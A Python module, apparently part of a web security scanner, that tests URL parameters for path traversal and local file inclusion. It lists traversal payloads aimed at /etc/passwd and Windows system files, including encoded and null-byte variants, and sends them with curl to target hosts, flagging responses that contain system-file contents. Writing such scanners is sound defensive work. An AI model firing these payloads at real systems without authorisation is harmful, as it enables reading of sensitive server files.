"""Path traversal / Local File Inclusion (LFI) detection."""
from .base import BaseCheck
from ..models import Finding
from ..utils import run


class PathTraversalCheck(BaseCheck):
    """Test parameters for ../../etc/passwd-style traversal and detect successful reads."""

    name = "Path Traversal"
    description = "Test for path traversal and local file inclusion"

    PAYLOADS = [
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "/etc/passwd%00",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "....\\\\....\\\\....\\\\windows\\\\win.ini",
    ]

    INDICATORS = [
        "root:x:0:0", "nobody:x:",
        "[fonts]", "[extensions]",
        "127.0.0.1       localhost",
    ]

    PARAMS = [
        "file", "path", "page", "include", "src",
        "dir", "folder", "template", "doc", "document",
        "load", "read", "img", "image", "p",
    ]

    def execute(self) -> list[Finding]:
        for base in self._hosts():
            for param in self.PARAMS:
                for payload in self.PAYLOADS:
                    test_url = f"{base}?{param}={payload}"
                    rc, body, _ = run(
                        ["curl", "-sL", "--max-time", "6", test_url],
                        timeout=10,
                    )
                    if rc != 0 or not body or len(body) < 20:
                        continue
                    for indicator in self.INDICATORS:
                        if indicator in body:
                            self.findings.append(Finding(
                                severity="critical",
                                title=f"Local File Inclusion via '{param}'",
                                host=base,
                                detail=f"Parameter '{param}' allows reading arbitrary files "
                                       f"(indicator: {indicator})",
                                source="path_traversal",
                                url=test_url,
                                evidence=indicator,
                            ))
                            return self.findings
        return self.findings
